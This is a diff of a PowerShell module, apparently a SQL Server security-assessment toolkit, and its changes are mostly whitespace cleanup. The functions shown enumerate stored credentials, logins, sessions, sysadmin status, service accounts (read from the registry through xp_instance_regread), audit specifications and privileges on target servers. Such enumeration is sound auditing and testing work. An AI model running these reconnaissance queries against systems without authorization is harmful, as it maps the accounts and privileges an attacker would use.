         HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
@@ -4134,18 +4139,18 @@ Function  Get-SQLServerCredential
             target_id
             FROM [master].[sys].[credentials]
         $CredentialNameFilter"
-        
+
         # Execute Query
         $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
 
-        # Append results             
-        $TblCredentials = $TblCredentials + $TblResults       
+        # Append results
+        $TblCredentials = $TblCredentials + $TblResults
     }
 
     End
-    {  
+    {
         # Return data
-        $TblCredentials          
+        $TblCredentials
     }
 }
 
@@ -4159,15 +4164,15 @@ Function  Get-SQLServerLogin
             .SYNOPSIS
             Returns logins from target SQL Servers.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .PARAMETER PrincipalName
-            Pincipal name to filter for. 
+            Pincipal name to filter for.
             .EXAMPLE
             PS C:\> Get-SQLServerLogin -Instance SQLServer1\STANDARDDEV2014 | Select-Object -First 1
 
@@ -4185,12 +4190,12 @@ Function  Get-SQLServerLogin
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account to authenticate with.')]
         [string]$Username,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account password to authenticate with.')]
         [string]$Password,
 
@@ -4198,15 +4203,15 @@ Function  Get-SQLServerLogin
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
         [string]$Instance,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipeline = $true,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipeline = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Principal name to filter for.')]
         [string]$PrincipalName,
 
@@ -4279,12 +4284,12 @@ Function  Get-SQLServerLogin
             name as [PrincipalName],
             sid as [PrincipalSid],
             type_desc as [PrincipalType],
-            create_date as [CreateDate], 
+            create_date as [CreateDate],
             LOGINPROPERTY ( name , 'IsLocked' ) as [IsLocked]
-            FROM [sys].[server_principals] 
+            FROM [sys].[server_principals]
             WHERE type = 'S' or type = 'U' or type = 'C'
         $PrincipalNameFilter"
-        
+
         # Execute Query
         $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
 
@@ -4311,14 +4316,14 @@ Function  Get-SQLServerLogin
                 $Sid,
                 [string]$_.PrincipalType,
                 $_.CreateDate,
-            [string]$_.IsLocked)         
-        }                        
+            [string]$_.IsLocked)
+        }
     }
 
     End
-    {  
+    {
         # Return data
-        $TblLogins          
+        $TblLogins
     }
 }
 
@@ -4333,13 +4338,13 @@ Function  Get-SQLSession
             .SYNOPSIS
             Returns active sessions from target SQL Servers.  Sysadmin privileges is required to view all sessions.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .EXAMPLE
             PS C:\> Get-SQLSession -Instance SQLServer1\STANDARDDEV2014 | Select-Object -First 1
 
@@ -4361,12 +4366,12 @@ Function  Get-SQLSession
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account to authenticate with.')]
         [string]$Username,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account password to authenticate with.')]
         [string]$Password,
 
@@ -4374,15 +4379,15 @@ Function  Get-SQLSession
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
         [string]$Instance,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipeline = $true,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipeline = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'PrincipalName.')]
         [string]$PrincipalName,
 
@@ -4463,9 +4468,9 @@ Function  Get-SQLSession
             FROM    [sys].[dm_exec_sessions]
             ORDER BY status
         $PrincipalNameFilter"
-        
+
         # Execute Query
-        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose     
+        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
 
         # Update sid formatting for each record
         $TblResults |
@@ -4491,14 +4496,14 @@ Function  Get-SQLSession
                 [string]$_.SessionId,
                 [string]$_.SessionStartTime,
                 [string]$_.SessionLoginTime,
-            [string]$_.SessionStatus)         
-        }                        
+            [string]$_.SessionStatus)
+        }
     }
 
     End
-    {  
+    {
         # Return data
-        $TblSessions          
+        $TblSessions
     }
 }
 
@@ -4513,19 +4518,19 @@ Function  Get-SQLSysadminCheck
             .SYNOPSIS
             Check if login is has sysadmin privilege on the target SQL Servers.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .EXAMPLE
-            PS C:\> Get-SQLSysadminCheck -Instance SQLServer1\STANDARDDEV2014 
+            PS C:\> Get-SQLSysadminCheck -Instance SQLServer1\STANDARDDEV2014
 
             ComputerName   Instance                       IsSysadmin
             ------------   --------                       ----------
-            SQLServer1     SQLServer1\STANDARDDEV2014     Yes 
+            SQLServer1     SQLServer1\STANDARDDEV2014     Yes
             .EXAMPLE
             PS C:\> Get-SQLInstanceDomain | Get-SQLStoredProcure -Verbose -NoDefaults
     #>
@@ -4543,9 +4548,9 @@ Function  Get-SQLSysadminCheck
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
         [string]$Instance,
 
@@ -4558,7 +4563,7 @@ Function  Get-SQLSysadminCheck
     {
         # Data for output
         $TblSysadminStatus = New-Object -TypeName System.Data.DataTable
-        
+
         # Setup CredentialName filter
         if($CredentialName)
         {
@@ -4605,22 +4610,22 @@ Function  Get-SQLSysadminCheck
         # Define Query
         $Query = "SELECT    '$ComputerName' as [ComputerName],
             '$Instance' as [Instance],
-            CASE 
+            CASE
             WHEN IS_SRVROLEMEMBER('sysadmin') =  0 THEN 'No'
             ELSE 'Yes'
         END as IsSysadmin"
-        
+
         # Execute Query
         $TblSysadminStatusTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
 
-        # Append results             
+        # Append results
         $TblSysadminStatus = $TblSysadminStatus + $TblSysadminStatusTemp
     }
 
     End
-    {  
+    {
         # Return data
-        $TblSysadminStatus        
+        $TblSysadminStatus
     }
 }
 
@@ -4635,15 +4640,15 @@ Function  Get-SQLServiceAccount
             .SYNOPSIS
             Returns a list of service account names for SQL Servers services by querying the registry with xp_regread.  This can be executed against remote systems.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .EXAMPLE
-            PS C:\> Get-SQLServiceAccount -Instance SQLServer1\STANDARDDEV2014 
+            PS C:\> Get-SQLServiceAccount -Instance SQLServer1\STANDARDDEV2014
 
             ComputerName     : SQLServer1
             Instance         : SQLServer1\STANDARDDEV2014
@@ -4672,9 +4677,9 @@ Function  Get-SQLServiceAccount
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
         [string]$Instance,
 
@@ -4743,18 +4748,18 @@ Function  Get-SQLServiceAccount
                 @value        = @WriterLogin OUTPUT
 
                 -- Get MSOLAP - Calculated
-                EXECUTE		master.dbo.xp_instance_regread  
-                N'HKEY_LOCAL_MACHINE', @MSOLAPInstance,  
+                EXECUTE		master.dbo.xp_instance_regread
+                N'HKEY_LOCAL_MACHINE', @MSOLAPInstance,
                 N'ObjectName',@AnalysisLogin OUTPUT
 
                 -- Get Reporting - Calculated
-                EXECUTE		master.dbo.xp_instance_regread  
-                N'HKEY_LOCAL_MACHINE', @ReportInstance,  
+                EXECUTE		master.dbo.xp_instance_regread
+                N'HKEY_LOCAL_MACHINE', @ReportInstance,
                 N'ObjectName',@ReportLogin OUTPUT
 
                 -- Get SQL Server DTS Server / Analysis - Calulated
-                EXECUTE		master.dbo.xp_instance_regread  
-                N'HKEY_LOCAL_MACHINE', @IntegrationVersion,  
+                EXECUTE		master.dbo.xp_instance_regread
+                N'HKEY_LOCAL_MACHINE', @IntegrationVersion,
             N'ObjectName',@IntegrationDtsLogin OUTPUT"
 
             $SysadminQuery = '	,[BrowserLogin] = @BrowserLogin,
@@ -4771,10 +4776,10 @@ Function  Get-SQLServiceAccount
 
         # Define Query
         $Query = "  -- Setup variables
-            DECLARE		@SQLServerInstance	VARCHAR(250)  
-            DECLARE		@MSOLAPInstance		VARCHAR(250) 
-            DECLARE		@ReportInstance 	VARCHAR(250) 
-            DECLARE		@AgentInstance	 	VARCHAR(250) 
+            DECLARE		@SQLServerInstance	VARCHAR(250)
+            DECLARE		@MSOLAPInstance		VARCHAR(250)
+            DECLARE		@ReportInstance 	VARCHAR(250)
+            DECLARE		@AgentInstance	 	VARCHAR(250)
             DECLARE		@IntegrationVersion	VARCHAR(250)
             DECLARE		@DBEngineLogin		VARCHAR(100)
             DECLARE		@AgentLogin		VARCHAR(100)
@@ -4782,36 +4787,36 @@ Function  Get-SQLServiceAccount
             DECLARE     	@WriterLogin		VARCHAR(100)
             DECLARE		@AnalysisLogin		VARCHAR(100)
             DECLARE		@ReportLogin		VARCHAR(100)
-            DECLARE		@IntegrationDtsLogin	VARCHAR(100)                    
+            DECLARE		@IntegrationDtsLogin	VARCHAR(100)
 
             -- Get Service Paths for default and name instance
             if @@SERVICENAME = 'MSSQLSERVER' or @@SERVICENAME = HOST_NAME()
-            BEGIN											
+            BEGIN
             -- Default instance paths
             set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLSERVER'
-            set @MSOLAPInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLServerOLAPService'	
+            set @MSOLAPInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLServerOLAPService'
             set @ReportInstance = 'SYSTEM\CurrentControlSet\Services\ReportServer'
-            set @AgentInstance = 'SYSTEM\CurrentControlSet\Services\SQLSERVERAGENT'	
+            set @AgentInstance = 'SYSTEM\CurrentControlSet\Services\SQLSERVERAGENT'
             set @IntegrationVersion  = 'SYSTEM\CurrentControlSet\Services\MsDtsServer'+ SUBSTRING(CAST(SERVERPROPERTY('productversion') AS VARCHAR(255)),0, 3) + '0'
-            END						
+            END
             ELSE
             BEGIN
             -- Named instance paths
-            set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQL$' + cast(@@SERVICENAME as varchar(250))	
-            set @MSOLAPInstance = 'SYSTEM\CurrentControlSet\Services\MSOLAP$' + cast(@@SERVICENAME as varchar(250))		
+            set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQL$' + cast(@@SERVICENAME as varchar(250))
+            set @MSOLAPInstance = 'SYSTEM\CurrentControlSet\Services\MSOLAP$' + cast(@@SERVICENAME as varchar(250))
             set @ReportInstance = 'SYSTEM\CurrentControlSet\Services\ReportServer$' + cast(@@SERVICENAME as varchar(250))
-            set @AgentInstance = 'SYSTEM\CurrentControlSet\Services\SQLAgent$' + cast(@@SERVICENAME as varchar(250))	
+            set @AgentInstance = 'SYSTEM\CurrentControlSet\Services\SQLAgent$' + cast(@@SERVICENAME as varchar(250))
             set @IntegrationVersion  = 'SYSTEM\CurrentControlSet\Services\MsDtsServer'+ SUBSTRING(CAST(SERVERPROPERTY('productversion') AS VARCHAR(255)),0, 3) + '0'
             END
 
             -- Get SQL Server - Calculated
-            EXECUTE		master.dbo.xp_instance_regread  
-            N'HKEY_LOCAL_MACHINE', @SQLServerInstance,  
+            EXECUTE		master.dbo.xp_instance_regread
+            N'HKEY_LOCAL_MACHINE', @SQLServerInstance,
             N'ObjectName',@DBEngineLogin OUTPUT
 
             -- Get SQL Server Agent - Calculated
-            EXECUTE		master.dbo.xp_instance_regread  
-            N'HKEY_LOCAL_MACHINE', @AgentInstance,  
+            EXECUTE		master.dbo.xp_instance_regread
+            N'HKEY_LOCAL_MACHINE', @AgentInstance,
             N'ObjectName',@AgentLogin OUTPUT
 
             $SysadminSetup
@@ -4819,21 +4824,21 @@ Function  Get-SQLServiceAccount
             -- Dislpay results
             SELECT		'$ComputerName' as [ComputerName],
             '$Instance' as [Instance],
-            [DBEngineLogin] = @DBEngineLogin, 
+            [DBEngineLogin] = @DBEngineLogin,
             [AgentLogin] = @AgentLogin
         $SysadminQuery"
 
         # Execute Query
         $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
 
-        # Append results             
-        $TblServiceAccount = $TblServiceAccount + $TblResults        
+        # Append results
+        $TblServiceAccount = $TblServiceAccount + $TblResults
     }
 
     End
-    {  
+    {
         # Return data
-        $TblServiceAccount         
+        $TblServiceAccount
     }
 }
 
@@ -4848,25 +4853,25 @@ Function  Get-SQLAuditDatabaseSpec
             .SYNOPSIS
             Returns Audit database specifications from target SQL Servers.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .PARAMETER DAC
-            Connect using Dedicated Admin Connection. 
+            Connect using Dedicated Admin Connection.
             .PARAMETER AuditName
-            Audit name. 
+            Audit name.
             .PARAMETER AuditSpecification
-            Audit specification. 
+            Audit specification.
             .PARAMETER AuditAction
             Audit action name.
             .EXAMPLE
             PS C:\> Get-SQLAuditDatabaseSpec -Verbose -Instance "SQLServer1"
             .EXAMPLE
-            PS C:\> Get-SQLInstanceLocal | Get-SQLAuditDatabaseSpec -Verbose    
+            PS C:\> Get-SQLInstanceLocal | Get-SQLAuditDatabaseSpec -Verbose
     #>
     [CmdletBinding()]
     Param(
@@ -4882,29 +4887,29 @@ Function  Get-SQLAuditDatabaseSpec
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
         [string]$Instance,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Audit name.')]
         [string]$AuditName,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Specification name.')]
         [string]$AuditSpecification,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Audit action name.')]
         [string]$AuditAction,
 
-        
-        
+
+
         [Parameter(Mandatory = $false,
         HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
         [switch]$SuppressVerbose
@@ -4951,7 +4956,7 @@ Function  Get-SQLAuditDatabaseSpec
         # Note: Tables queried by this function typically require sysadmin privileges.
 
         # Parse computer name from the instance
-        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance 
+        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
 
         # Default connection to local default instance
         if(-not $Instance)
@@ -4959,7 +4964,7 @@ Function  Get-SQLAuditDatabaseSpec
             $Instance = $env:COMPUTERNAME
         }
 
-       
+
         # Test connection to instance
         $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
             $_.Status -eq 'Accessible'
@@ -4979,18 +4984,18 @@ Function  Get-SQLAuditDatabaseSpec
             }
             return
         }
-        
-                       
+
+
         # Define Query
         $Query = "  SELECT  '$ComputerName' as [ComputerName],
             '$Instance' as [Instance],
-            audit_id as [AuditId], 
-            a.name as [AuditName], 
+            audit_id as [AuditId],
+            a.name as [AuditName],
             s.name as [AuditSpecification],
             d.audit_action_id as [AuditActionId],
             d.audit_action_name as [AuditAction],
             s.is_state_enabled,
-            d.is_group,	
+            d.is_group,
             s.create_date,
             s.modify_date,
             d.audited_result
@@ -4998,22 +5003,22 @@ Function  Get-SQLAuditDatabaseSpec
             JOIN sys.database_audit_specifications AS s
             ON a.audit_guid = s.audit_guid
             JOIN sys.database_audit_specification_details AS d
-            ON s.database_specification_id = d.database_specification_id WHERE 1=1                   
+            ON s.database_specification_id = d.database_specification_id WHERE 1=1
             $AuditNameFilter
             $SpecNameFilter
         $ActionNameFilter"
 
-        # Execute Query        
+        # Execute Query
         $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -SuppressVerbose
 
-        # Append results             
-        $TblAuditDatabaseSpec = $TblAuditDatabaseSpec + $TblResults      
+        # Append results
+        $TblAuditDatabaseSpec = $TblAuditDatabaseSpec + $TblResults
     }
 
     End
-    {  
+    {
         # Return data
-        $TblAuditDatabaseSpec        
+        $TblAuditDatabaseSpec
     }
 }
 
@@ -5028,25 +5033,25 @@ Function  Get-SQLAuditServerSpec
             .SYNOPSIS
             Returns Audit server specifications from target SQL Servers.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .PARAMETER DAC
-            Connect using Dedicated Admin Connection. 
+            Connect using Dedicated Admin Connection.
             .PARAMETER AuditName
-            Audit name. 
+            Audit name.
             .PARAMETER AuditSpecification
-            Audit specification. 
+            Audit specification.
             .PARAMETER AuditAction
             Audit action name.
             .EXAMPLE
             PS C:\> Get-SQLAuditServerSpec -Verbose -Instance "SQLServer1"
             .EXAMPLE
-            PS C:\> Get-SQLInstanceLocal | Get-SQLAuditServerSpec -Verbose    
+            PS C:\> Get-SQLInstanceLocal | Get-SQLAuditServerSpec -Verbose
     #>
     [CmdletBinding()]
     Param(
@@ -5062,24 +5067,24 @@ Function  Get-SQLAuditServerSpec
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
         [string]$Instance,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Audit name.')]
         [string]$AuditName,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Specification name.')]
         [string]$AuditSpecification,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Audit action name.')]
         [string]$AuditAction,
 
@@ -5129,7 +5134,7 @@ Function  Get-SQLAuditServerSpec
         # Note: Tables queried by this function typically require sysadmin privileges.
 
         # Parse computer name from the instance
-        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance 
+        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
 
         # Default connection to local default instance
         if(-not $Instance)
@@ -5160,13 +5165,13 @@ Function  Get-SQLAuditServerSpec
         # Define Query
         $Query = "  SELECT  '$ComputerName' as [ComputerName],
             '$Instance' as [Instance],
-            audit_id as [AuditId], 
-            a.name as [AuditName], 
+            audit_id as [AuditId],
+            a.name as [AuditName],
             s.name as [AuditSpecification],
             d.audit_action_name as [AuditAction],
             s.is_state_enabled,
             d.is_group,
-            d.audit_action_id as [AuditActionId],	
+            d.audit_action_id as [AuditActionId],
             s.create_date,
             s.modify_date
             FROM sys.server_audits AS a
@@ -5181,14 +5186,14 @@ Function  Get-SQLAuditServerSpec
         # Execute Query
         $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -SuppressVerbose
 
-        # Append results             
-        $TblAuditServerSpec  = $TblAuditServerSpec  + $TblResults       
+        # Append results
+        $TblAuditServerSpec  = $TblAuditServerSpec  + $TblResults
     }
 
     End
-    {  
+    {
         # Return data
-        $TblAuditServerSpec           
+        $TblAuditServerSpec
     }
 }
 
@@ -5197,21 +5202,21 @@ Function  Get-SQLAuditServerSpec
 #  Get-SQLServerPriv
 # ----------------------------------
 # Author: Scott Sutherland
-Function  Get-SQLServerPriv 
+Function  Get-SQLServerPriv
 {
     <#
             .SYNOPSIS
             Returns SQL Server login privilege information from target SQL Servers.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .PARAMETER PermissionName
-            Permission name to filter for. 
+            Permission name to filter for.
             .EXAMPLE
             PS C:\> Get-SQLServerPriv -Instance SQLServer1\STANDARDDEV2014 -PermissionName IMPERSONATE
 
@@ -5241,15 +5246,15 @@ Function  Get-SQLServerPriv
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
         [string]$Instance,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipeline = $true,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipeline = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Permission name.')]
         [string]$PermissionName,
 
@@ -5337,9 +5342,9 @@ Function  Get-SQLServerPriv
     }
 
     End
-    {  
+    {
         # Return data
-        $TblServerPrivs           
+        $TblServerPrivs
     }
 }
 
@@ -5348,21 +5353,21 @@ Function  Get-SQLServerPriv
 #  Get-SQLDatabasePriv
 # ----------------------------------
 # Author: Scott Sutherland
-Function  Get-SQLDatabasePriv 
+Function  Get-SQLDatabasePriv
 {
     <#
             .SYNOPSIS
             Returns database user privilege information from target SQL Servers.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .PARAMETER DAC
-            Connect using Dedicated Admin Connection. 
+            Connect using Dedicated Admin Connection.
             .PARAMETER DatabaseName
             Database name to filter for.
             .PARAMETER NoDefaults
@@ -5372,7 +5377,7 @@ Function  Get-SQLDatabasePriv
             .PARAMETER PermissionType
             Permission type name to filter for.
             .PARAMETER PrincipalName
-            Principal name to filter for.        
+            Principal name to filter for.
             .EXAMPLE
             PS C:\> Get-SQLDatabasePriv -Instance SQLServer1\STANDARDDEV2014 -DatabaseName testdb -PermissionName "VIEW DEFINITION"
 
@@ -5403,34 +5408,34 @@ Function  Get-SQLDatabasePriv
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
         [string]$Instance,
 
-        [Parameter(Mandatory = $false,                
-        ValueFromPipelineByPropertyName = $true,
+        [Parameter(Mandatory = $false,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server database name to filter for.')]
         [string]$DatabaseName,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Permission name to filter for.')]
         [string]$PermissionName,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Permission type to filter for.')]
         [string]$PermissionType,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Principal name for grantee to filter for.')]
         [string]$PrincipalName,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = "Don't select permissions for default databases.")]
         [switch]$NoDefaults,
 
@@ -5453,7 +5458,7 @@ Function  Get-SQLDatabasePriv
         {
             $PermissionNameFilter = ''
         }
-        
+
         # Setup PermissionName filter
         if($PrincipalName)
         {
@@ -5476,7 +5481,7 @@ Function  Get-SQLDatabasePriv
     }
 
     Process
-    {   
+    {
         # Note: Tables queried by this function typically require sysadmin privileges.
 
         # Parse computer name from the instance
@@ -5497,11 +5502,11 @@ Function  Get-SQLDatabasePriv
         else
         {
             # Get list of databases
-            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -SuppressVerbose         
-        }  
+            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -SuppressVerbose
+        }
 
         # Get the privs for each database
-        $TblDatabases | 
+        $TblDatabases |
         ForEach-Object -Process {
             # Set DatabaseName filter
             $DbName = $_.DatabaseName
@@ -5511,29 +5516,29 @@ Function  Get-SQLDatabasePriv
                 SELECT  '$ComputerName' as [ComputerName],
                 '$Instance' as [Instance],
                 '$DbName' as [DatabaseName],
-                rp.name as [PrincipalName], 
-                rp.type_desc as [PrincipalType], 
-                pm.class_desc as [PermissionType], 
-                pm.permission_name as [PermissionName], 
-                pm.state_desc as [StateDescription], 
-                ObjectType = CASE 
-                WHEN obj.type_desc IS NULL 
-                OR obj.type_desc = 'SYSTEM_TABLE' THEN 
-                pm.class_desc 
-                ELSE 
-                obj.type_desc 
-                END, 
-                [ObjectName] = Isnull(ss.name, Object_name(pm.major_id)) 
-                FROM   $DbName.sys.database_principals rp 
-                INNER JOIN $DbName.sys.database_permissions pm 
-                ON pm.grantee_principal_id = rp.principal_id 
-                LEFT JOIN $DbName.sys.schemas ss 
-                ON pm.major_id = ss.schema_id 
-                LEFT JOIN $DbName.sys.objects obj 
+                rp.name as [PrincipalName],
+                rp.type_desc as [PrincipalType],
+                pm.class_desc as [PermissionType],
+                pm.permission_name as [PermissionName],
+                pm.state_desc as [StateDescription],
+                ObjectType = CASE
+                WHEN obj.type_desc IS NULL
+                OR obj.type_desc = 'SYSTEM_TABLE' THEN
+                pm.class_desc
+                ELSE
+                obj.type_desc
+                END,
+                [ObjectName] = Isnull(ss.name, Object_name(pm.major_id))
+                FROM   $DbName.sys.database_principals rp
+                INNER JOIN $DbName.sys.database_permissions pm
+                ON pm.grantee_principal_id = rp.principal_id
